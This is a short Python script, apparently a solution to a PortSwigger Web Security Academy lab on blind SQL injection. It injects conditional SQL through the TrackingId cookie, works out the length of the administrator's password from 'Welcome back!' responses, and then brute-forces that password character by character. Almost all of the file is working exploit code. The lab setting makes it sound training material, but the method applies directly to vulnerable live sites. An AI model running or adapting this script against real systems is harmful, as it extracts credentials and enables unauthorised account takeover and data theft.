# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

import requests
import string
import time

URL = "https://....web-security-academy.net"
TRACKING_ID = "..."
alphabet = string.digits + string.ascii_letters
password_length = 0
password = ''


# Determine the password length
# ' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = 1--

while True:

    injection = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = {password_length}--"
    cookies = {
        "TrackingId": TRACKING_ID + injection
    }

    r = requests.get(url = URL, cookies = cookies)

    if "Welcome back!" in r.text:
        break
    else:
        password_length += 1
        time.sleep(0.25)

print("Password length: ", password_length)


# Brute-force the password
# ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) = 'a

while len(password) < password_length:

    for c in alphabet:

        injection = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,{len(password) + 1}) = '{password + c}"
        cookies = {
            "TrackingId": TRACKING_ID + injection
        }

        r = requests.get(url = URL, cookies = cookies)

        if "Welcome back!" in r.text:
            password += c
            print(password)
            break
        else:
            time.sleep(0.25)

print("Password: ", password)
